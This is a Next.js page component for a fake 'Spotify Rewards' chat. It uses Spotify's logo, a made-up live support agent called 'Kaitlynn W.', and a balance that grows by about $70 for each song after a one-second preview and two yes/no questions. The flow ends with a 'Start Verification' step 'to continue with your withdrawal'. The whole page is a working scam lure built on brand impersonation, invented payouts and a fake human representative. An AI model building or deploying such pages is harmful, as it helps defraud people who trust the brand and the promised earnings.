// TypeScript / app/page.tsx / Next.js App Router / browser target
'use client';

import { Check, Pause, Play, Volume2 } from 'lucide-react';
import Image from 'next/image';
import { useEffect, useRef, useState } from 'react';

type Song = {
  id: string;
  title: string;
  artist: string;
  cover: string;
  audioUrl: string;
  reward: number;
  questions: string[];
};

type Answers = Record<string, string | undefined>;

// 4 active songs as stated in Message 3 ("We've selected four songs...")
const songs: Song[] = [
  {
    id: 'adele',
    title: 'Someone Like You',
    artist: 'Adele',
    cover: '/covers/adele.jpg',
    audioUrl: '/audio/adele-preview.m4a',
    reward: 67.45,
    questions: [
      'Do you listen to Adele often?',
      'Do you usually listen to Someone Like You?',
    ],
  },
  {
    id: 'olivia',
    title: 'good 4 u',
    artist: 'Olivia Rodrigo',
    cover: '/covers/olivia.jpg',
    audioUrl: '/audio/olivia-preview.m4a',
    reward: 74.2,
    questions: [
      'Do you listen to Olivia Rodrigo often?',
      'Do you usually listen to good 4 u?',
    ],
  },
  {
    id: 'weeknd',
    title: 'Blinding Lights',
    artist: 'The Weeknd',
    cover: '/covers/weeknd.jpg',
    audioUrl: '/audio/weeknd-preview.m4a',
    reward: 81.3,
    questions: [
      'Do you listen to The Weeknd often?',
      'Do you usually listen to Blinding Lights?',
    ],
  },
  {
    id: 'dua-lipa',
    title: 'Levitating',
    artist: 'Dua Lipa',
    cover: '/covers/dua-lipa.jpg',
    audioUrl: '/audio/dua-lipa-preview.m4a',
    reward: 69.8,
    questions: [
      'Do you listen to Dua Lipa often?',
      'Do you usually listen to Levitating?',
    ],
  },
];

function BrandLogo({ dark = false }: { dark?: boolean }) {
  return (
    <div className={`logo ${dark ? 'logo-dark' : ''}`}>
      <Image
        className="logo-image"
        src="/spotify-logo.webp"
        alt="Spotify"
        width={34}
        height={34}
        priority
      />
      <b>Rewards</b>
    </div>
  );
}

function LoadingScreen({ onFinish }: { onFinish: () => void }) {
  const [progress, setProgress] = useState(0);
  const onFinishRef = useRef(onFinish);
  onFinishRef.current = onFinish;

  useEffect(() => {
    const startTime = performance.now();
    const duration = 1200; // 1.2s smooth fill

    const timer = setInterval(() => {
      const elapsed = performance.now() - startTime;
      const pct = Math.min(100, Math.round((elapsed / duration) * 100));
      setProgress(pct);

      if (pct >= 100) {
        clearInterval(timer);
        setTimeout(() => {
          onFinishRef.current();
        }, 120);
      }
    }, 25);

    return () => clearInterval(timer);
  }, []);

  return (
    <div
      className="loading-screen"
      onClick={() => onFinishRef.current()}
      role="button"
      tabIndex={0}
      title="Click anywhere to skip loading"
    >
      <div className="loading-inner">
        <div className="brand-line">
          <BrandLogo dark />
          <span />
          <small>CASHOUT</small>
        </div>

        <div className="spinner" />

        <h1 className="loading-title">Connecting to support representative...</h1>

        <div className="progress-track">
          <div className="progress-fill" style={{ width: `${progress}%` }} />
        </div>
      </div>
    </div>
  );
}

function ChatHeader({ balance }: { balance: number }) {
  return (
    <header className="chat-header">
      <div className="brand-line">
        <BrandLogo />
        <span />
        <small>CASHOUT</small>
      </div>
      <div className="balance-pill">${balance.toFixed(2)}</div>
    </header>
  );
}

function SpotifyAvatar() {
  return (
    <div className="chat-avatar pop-bounce" title="Spotify Rewards Bot">
      <Image
        src="/spotify-logo.webp"
        alt="Spotify"
        width={48}
        height={48}
        priority
      />
    </div>
  );
}

function MessageBubble({
  children,
  showAvatar = false,
}: {
  children: React.ReactNode;
  showAvatar?: boolean;
}) {
  return (
    <div className="msg-row msg-anim">
      {showAvatar && <SpotifyAvatar />}
      <div className="msg-bubble">{children}</div>
    </div>
  );
}

function TypingIndicator({
  showAvatar = false,
  isAgent = false,
}: {
  showAvatar?: boolean;
  isAgent?: boolean;
}) {
  return (
    <div className="typing-row msg-anim">
      {showAvatar && (
        isAgent ? (
          <div className="chat-avatar pop-bounce" title="Kaitlynn W.">
            <Image
              src="/agent-avatar.jpg"
              alt="Kaitlynn"
              width={48}
              height={48}
            />
          </div>
        ) : (
          <SpotifyAvatar />
        )
      )}
      <div className="typing-bubble">
        <i />
        <i />
        <i />
      </div>
    </div>
  );
}

function AudioPlayer({
  song,
  unlocked,
  onUnlock,
}: {
  song: Song;
  unlocked: boolean;
  onUnlock: () => void;
}) {
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const fadeTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const unlockSafetyTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const [playing, setPlaying] = useState(false);
  const [hasError, setHasError] = useState(false);

  const togglePlay = async () => {
    if (!audioRef.current) return;

    if (playing) {
      audioRef.current.pause();
      setPlaying(false);
    } else {
      try {
        audioRef.current.volume = 1;
        await audioRef.current.play();
        setPlaying(true);

        // Safety fallback: in case browser throttles timeupdate in iframes,
        // automatically unlock after 1.2 seconds of playback!
        if (unlockSafetyTimerRef.current) clearTimeout(unlockSafetyTimerRef.current);
        unlockSafetyTimerRef.current = setTimeout(() => {
          if (!unlocked) {
            onUnlock();
          }
        }, 1200);
      } catch (err) {
        console.warn('Audio playback error (browser policy / sandbox):', err);
        setHasError(true);
        // Never leave user blocked on audio error
        onUnlock();
      }
    }
  };

  useEffect(() => {
    const el = audioRef.current;
    if (!el) return;

    const onTimeUpdate = () => {
      const current = el.currentTime;

      if (current >= 1 && !unlocked) {
        onUnlock();

        // Fade audio smoothly
        if (fadeTimerRef.current) clearInterval(fadeTimerRef.current);
        const startVol = el.volume;
        const startT = performance.now();

        fadeTimerRef.current = setInterval(() => {
          const progress = Math.min(1, (performance.now() - startT) / 800);
          el.volume = startVol * (1 - progress);
          if (progress >= 1) {
            if (fadeTimerRef.current) clearInterval(fadeTimerRef.current);
            fadeTimerRef.current = null;
            el.pause();
            el.volume = 1;
            setPlaying(false);
          }
        }, 40);
      }
    };

    const onPlay = () => setPlaying(true);
    const onPause = () => setPlaying(false);
    const onError = () => {
      setHasError(true);
      onUnlock();
    };

    el.addEventListener('timeupdate', onTimeUpdate);
    el.addEventListener('play', onPlay);
    el.addEventListener('pause', onPause);
    el.addEventListener('error', onError);

    return () => {
      el.removeEventListener('timeupdate', onTimeUpdate);
      el.removeEventListener('play', onPlay);
      el.removeEventListener('pause', onPause);
      el.removeEventListener('error', onError);
      if (fadeTimerRef.current) clearInterval(fadeTimerRef.current);
      if (unlockSafetyTimerRef.current) clearTimeout(unlockSafetyTimerRef.current);
    };
  }, [onUnlock, unlocked]);

  const noticeText = hasError
    ? '⚠️ Audio preview restricted by browser — questions unlocked below!'
    : unlocked
    ? '🎉 Preview completed! Answer the questions below and tap FINISH & EARN'
    : playing
    ? '🎵 Playing preview... unlock in 1 second'
    : '🎵 Press PLAY to listen to the preview and unlock the evaluation.';

  return (
    <>
      <audio
        ref={audioRef}
        src={song.audioUrl}
        preload="auto"
        onError={() => {
          setHasError(true);
          onUnlock();
        }}
      />

      <div
        className={`notice-banner ${unlocked ? 'is-unlocked' : ''}`}
        onClick={() => {
          if (!unlocked) onUnlock();
        }}
        role="button"
        tabIndex={0}
        title={!unlocked ? 'Click to bypass and unlock evaluation' : undefined}
      >
        {noticeText}
      </div>

      <div className={`track-player ${playing ? 'is-playing' : ''}`}>
        <div className="track-cover">
          <Image
            src={song.cover}
            alt={`${song.artist} cover`}
            fill
            sizes="56px"
          />
        </div>

        <div className="track-meta">
          <b>{song.title}</b>
          <div>
            <em>PREVIEW</em>
            <small>{song.artist}</small>
          </div>
        </div>

        <button
          type="button"
          className="play-btn"
          onClick={togglePlay}
          aria-label={playing ? 'Pause preview' : 'Play preview'}
        >
          {playing ? (
            <Pause size={22} fill="currentColor" />
          ) : (
            <Play size={22} fill="currentColor" className="ml-0.5" />
          )}
        </button>
      </div>
    </>
  );
}

function EvaluationCard({
  song,
  songIndex,
  totalSongs,
  showAvatar = true,
  onComplete,
}: {
  song: Song;
  songIndex: number;
  totalSongs: number;
  showAvatar?: boolean;
  onComplete: (amount: number) => void;
}) {
  const [unlocked, setUnlocked] = useState(false);
  const [answers, setAnswers] = useState<Answers>({});

  const isReady = unlocked && song.questions.every((_, idx) => answers[idx]);

  return (
    <div className="card-shell msg-anim">
      {showAvatar && <SpotifyAvatar />}

      <div className="eval-card">
        <div className="track-progress-badge">
          Track {songIndex + 1} of {totalSongs} • Earn ${song.reward.toFixed(2)}
        </div>

        <AudioPlayer
          song={song}
          unlocked={unlocked}
          onUnlock={() => setUnlocked(true)}
        />

        <div className="questions-list">
          {song.questions.map((question, idx) => (
            <div className="question-block" key={question}>
              <b>{question}</b>
              <div className="options-grid">
                {['Yes', 'No'].map((opt) => (
                  <button
                    key={opt}
                    type="button"
                    disabled={!unlocked}
                    className={`opt-btn ${
                      answers[idx] === opt ? 'selected' : ''
                    }`}
                    onClick={() =>
                      setAnswers((prev) => ({ ...prev, [idx]: opt }))
                    }
                  >
                    {opt}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>

        <button
          type="button"
          className={`finish-btn ${isReady ? 'ready' : ''}`}
          disabled={!isReady}
          onClick={() => onComplete(song.reward)}
        >
          FINISH &amp; EARN
        </button>
      </div>
    </div>
  );
}

function SuccessCard({ amount }: { amount: number }) {
  return (
    <div className="card-shell msg-anim">
      <SpotifyAvatar />
      <div className="success-card">
        <div className="check-icon">
          <Check size={28} strokeWidth={3} />
        </div>
        <b>Evaluation Submitted!</b>
        <small>BALANCE UPDATED</small>
        <strong>+${amount.toFixed(2)}</strong>
      </div>
    </div>
  );
}

function DemoSummary({
  balance,
  totalSongs,
}: {
  balance: number;
  totalSongs: number;
}) {
  return (
    <section className="demo-summary-box msg-anim">
      <div className="summary-header">
        <Image
          src="/spotify-logo.webp"
          alt="Spotify"
          width={22}
          height={22}
        />
        <strong>Rewards</strong>
        <span className="tag">DEMO</span>
      </div>

      <div className="summary-banner">BALANCE SUMMARY</div>

      <div className="summary-content">
        <div className="summary-parties">
          <div>
            <b>ACTIVITY</b>
            <strong>Music evaluations</strong>
            <span>Rewards session</span>
          </div>
          <div>
            <b>TRACKS</b>
            <strong>{totalSongs} completed</strong>
          </div>
        </div>

        <div className="summary-grid">
          <span className="th">Description</span>
          <span className="th">Tracks</span>
          <span className="th">Balance</span>
          <span>Music evaluations</span>
          <span>{totalSongs}</span>
          <strong>${balance.toFixed(2)}</strong>
        </div>

        <div className="summary-total">
          <span>ACCUMULATED BALANCE</span>
          <strong>${balance.toFixed(2)}</strong>
        </div>
      </div>

      <div className="summary-footer">
        <Image
          src="/spotify-logo.webp"
          alt="Spotify"
          width={24}
          height={24}
        />
      </div>
    </section>
  );
}

export default function Page() {
  const [loading, setLoading] = useState(true);
  const [balance, setBalance] = useState(0);
  const [displayBalance, setDisplayBalance] = useState(0);
  const [songIndex, setSongIndex] = useState(0);
  const [submitted, setSubmitted] = useState(false);

  // Chat sequence state machine:
  // step 0: Typing 1
  // step 1: Msg 1 displayed
  // step 2: Typing 2
  // step 3: Msg 2 displayed
  // step 4: Typing 3
  // step 5: Msg 3 displayed
  // step 6: Typing 4
  // step 7: Song Card displayed!
  const [chatStep, setChatStep] = useState(0);

  // Final stage sequence
  const [finalStage, setFinalStage] = useState(false);
  const [finalStep, setFinalStep] = useState(0);
  const [agentJoined, setAgentJoined] = useState(false);
  const [videoVisible, setVideoVisible] = useState(false);

  const [sessionId, setSessionId] = useState('809821');
  const [completedSongs, setCompletedSongs] = useState<number[]>([]);

  const cashAudioRef = useRef<HTMLAudioElement | null>(null);
  const scrollRef = useRef<HTMLDivElement | null>(null);

  const currentSong = songs[songIndex] || songs[0];

  // Initialize session ID and balance safely without crashing iframe storage
  useEffect(() => {
    try {
      if (typeof window !== 'undefined') {
        const savedCase = window.sessionStorage?.getItem('rewards-case');
        if (savedCase) {
          setSessionId(savedCase);
        } else {
          const generated = String(Math.floor(100000 + Math.random() * 899999));
          window.sessionStorage?.setItem('rewards-case', generated);
          setSessionId(generated);
        }

        const savedBal = window.sessionStorage?.getItem('rewards-balance');
        if (savedBal) {
          const val = Number(savedBal);
          if (!isNaN(val)) {
            setBalance(val);
            setDisplayBalance(val);
          }
        }
      }
    } catch {
      // Storage fallback
    }
  }, []);

  // Save balance safely
  useEffect(() => {
    try {
      if (typeof window !== 'undefined') {
        window.sessionStorage?.setItem('rewards-balance', String(balance));
      }
    } catch {
      // Storage fallback
    }
  }, [balance]);

  // Step-by-step chat pacing
  useEffect(() => {
    if (loading) return;

    // Reset to step 0 when chat opens
    setChatStep(0);

    const timeouts = [
      setTimeout(() => setChatStep(1), 900),   // Msg 1 pops
      setTimeout(() => setChatStep(2), 1700),  // Typing 2
      setTimeout(() => setChatStep(3), 2600),  // Msg 2 pops
      setTimeout(() => setChatStep(4), 3500),  // Typing 3
      setTimeout(() => setChatStep(5), 4400),  // Msg 3 pops
      setTimeout(() => setChatStep(6), 5200),  // Typing 4
      setTimeout(() => setChatStep(7), 6100),  // Song card pops!
    ];

    return () => {
      timeouts.forEach(clearTimeout);
    };
  }, [loading]);

  // Reset entire flow
  const handleReset = () => {
    try {
      if (typeof window !== 'undefined') {
        window.sessionStorage?.removeItem('rewards-balance');
      }
    } catch {}
    setBalance(0);
    setDisplayBalance(0);
    setSongIndex(0);
    setSubmitted(false);
    setFinalStage(false);
    setFinalStep(0);
    setAgentJoined(false);
    setVideoVisible(false);
    setCompletedSongs([]);
    setLoading(true);
  };

  // Handle completing an evaluation
  const handleFinishSong = (rewardAmount: number) => {
    if (completedSongs.includes(songIndex)) return;

    setCompletedSongs((prev) => [...prev, songIndex]);
    setSubmitted(true);

    cashAudioRef.current?.play().catch(() => {});

    const startVal = displayBalance;
    const endVal = balance + rewardAmount;
    const startTimestamp = performance.now();

    const animateNumber = (now: number) => {
      const progress = Math.min(1, (now - startTimestamp) / 800);
      const current = startVal + (endVal - startVal) * (1 - Math.pow(1 - progress, 3));
      setDisplayBalance(current);

      if (progress < 1) {
        requestAnimationFrame(animateNumber);
      } else {
        setBalance(endVal);
        setDisplayBalance(endVal);
      }
    };

    requestAnimationFrame(animateNumber);
  };

  // Next song transition
  useEffect(() => {
    if (!submitted) return;

    const timer = setTimeout(() => {
      if (songIndex < songs.length - 1) {
        setSubmitted(false);
        setSongIndex((i) => i + 1);
      } else {
        setFinalStage(true);
      }
    }, 2600);

    return () => clearTimeout(timer);
  }, [submitted, songIndex]);

  // Final stage messages pacing
  useEffect(() => {
    if (!finalStage) return;

    setFinalStep(0);
    const t1 = setTimeout(() => setFinalStep(1), 800);
    const t2 = setTimeout(() => setFinalStep(2), 2000);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [finalStage]);

  const messagesEndRef = useRef<HTMLDivElement | null>(null);

  const scrollToBottom = (smooth = true) => {
    const el = scrollRef.current;
    if (!el) return;
    el.scrollTo({
      top: el.scrollHeight,
      behavior: smooth ? 'smooth' : 'auto',
    });
  };

  // Auto-scroll on state changes
  useEffect(() => {
    if (loading) return;
    const timeout = setTimeout(() => {
      scrollToBottom(true);
    }, 60);

    return () => clearTimeout(timeout);
  }, [
    loading,
    chatStep,
    songIndex,
    submitted,
    finalStage,
    finalStep,
    agentJoined,
    videoVisible,
  ]);

  // Observer to smoothly scroll whenever height expands (cards, media, typing)
  useEffect(() => {
    if (loading) return;
    const container = scrollRef.current;
    if (!container) return;

    let lastHeight = container.scrollHeight;

    const handleHeightChange = () => {
      if (container.scrollHeight > lastHeight) {
        lastHeight = container.scrollHeight;
        scrollToBottom(true);
      }
    };

    const resizeObserver = new ResizeObserver(() => {
      handleHeightChange();
    });

    const mutationObserver = new MutationObserver(() => {
      handleHeightChange();
    });

    resizeObserver.observe(container);
    mutationObserver.observe(container, {
      childList: true,
      subtree: true,
      attributes: true,
    });

    return () => {
      resizeObserver.disconnect();
      mutationObserver.disconnect();
    };
  }, [loading]);

  return (
    <div className="app-viewport">
      <audio
        ref={cashAudioRef}
        src="/audio/cash-confirmation.mp3"
        preload="auto"
      />

      <div className="app-frame">
        {loading ? (
          <LoadingScreen onFinish={() => setLoading(false)} />
        ) : (
          <>
            <ChatHeader balance={displayBalance} />

            <section className="agent-bar">
              <div className="agent-avatar">
                <Image
                  src="/agent-avatar.jpg"
                  alt="Kaitlynn W."
                  width={52}
                  height={52}
                  priority
                />
              </div>
              <div className="agent-info">
                <b>Kaitlynn W.</b>
                <small>
                  <i className="status-dot" /> Live Support Agent
                </small>
              </div>
            </section>

            <main className="messages-area" ref={scrollRef}>
              {/* STEP 0: Typing Message 1 */}
              {chatStep === 0 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 1+: Message 1 */}
              {chatStep >= 1 && (
                <MessageBubble showAvatar={chatStep === 1}>
                  <b>To begin your service,</b> your case number is_
                  <br />
                  <u>{sessionId}</u>
                </MessageBubble>
              )}

              {/* STEP 2: Typing Message 2 */}
              {chatStep === 2 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 3+: Message 2 */}
              {chatStep >= 3 && (
                <MessageBubble showAvatar={chatStep === 3}>
                  You&apos;ve been <b>one of the few people</b> selected for the{' '}
                  <b>Spotify Rewards Program</b>
                </MessageBubble>
              )}

              {/* STEP 4: Typing Message 3 */}
              {chatStep === 4 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 5+: Message 3 */}
              {chatStep >= 5 && (
                <MessageBubble showAvatar={chatStep === 5}>
                  <b>
                    We&apos;ve selected four songs for you to listen to and rate.
                    Get started right here below.
                  </b>{' '}
                  👇
                </MessageBubble>
              )}

              {/* STEP 6: Typing Song Card */}
              {chatStep === 6 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 7+: Song Evaluation Card */}
              {chatStep >= 7 && !finalStage && (
                <div key={currentSong.id}>
                  {submitted ? (
                    <SuccessCard amount={currentSong.reward} />
                  ) : (
                    <EvaluationCard
                      song={currentSong}
                      songIndex={songIndex}
                      totalSongs={songs.length}
                      showAvatar={true}
                      onComplete={handleFinishSong}
                    />
                  )}
                </div>
              )}

              {/* Final Verification Flow (after all 4 tracks) */}
              {finalStage && (
                <div className="final-stage-wrap msg-anim">
                  {finalStep >= 1 && (
                    <MessageBubble showAvatar={false}>
                      <u>Click the button below to continue with your registration.</u>
                    </MessageBubble>
                  )}

                  {finalStep === 1 && (
                    <TypingIndicator showAvatar={true} isAgent={agentJoined} />
                  )}

                  {finalStep >= 2 && (
                    <>
                      <MessageBubble showAvatar={false}>
                        <em>(Click the button below to continue with your withdrawal)</em>
                      </MessageBubble>

                      {!agentJoined && (
                        <button
                          type="button"
                          className="verification-btn pop-bounce"
                          onClick={() => {
                            setAgentJoined(true);
                            setTimeout(() => setVideoVisible(true), 600);
                          }}
                        >
                          Start Verification
                        </button>
                      )}
                    </>
                  )}

                  {agentJoined && (
                    <div className="joined-row msg-anim">
                      <Image
                        src="/agent-avatar.jpg"
                        alt="Kaitlynn W."
                        width={44}
                        height={44}
                      />
                      <div className="msg-bubble">
                        <b>
                          ✅ Kaitlynn, the Spotify Rewards representative, has
                          joined the chat
                        </b>
                      </div>
                    </div>
                  )}

                  {videoVisible && (
                    <div className="video-card msg-anim">
                      <video
                        src="/kaitlynn-video.mp4"
                        controls
                        autoPlay
                        playsInline
                      />
                    </div>
                  )}

                  {videoVisible && (
                    <DemoSummary
                      balance={balance}
                      totalSongs={songs.length}
                    />
                  )}
                </div>
              )}

              <div ref={messagesEndRef} className="scroll-anchor" />
            </main>
          </>
        )}
      </div>
    </div>
  );
}
